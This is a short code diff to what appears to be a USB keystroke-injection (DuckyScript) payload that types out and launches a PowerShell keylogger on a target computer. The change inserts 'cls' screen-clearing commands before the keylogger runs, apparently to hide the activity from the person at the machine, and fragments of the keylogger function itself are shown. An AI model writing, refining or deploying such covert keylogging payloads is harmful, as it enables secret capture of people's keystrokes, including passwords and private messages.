@@ -224,9 +224,11 @@ DELAY 100
 STRING }
 ENTER
 DELAY 100
-STRING KeyLogger
+STRING cls
 ENTER
 DELAY 100
+STRING KeyLogger
+ENTER
 
 ----Powershell Script---- FYI, you do not need to do anything with this, this is just for reference
 function KeyLogger($logPath="KeyLog.txt") 
@@ -296,5 +298,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     del KeyLog.txt
   }
 }
+
+cls
 
 KeyLogger
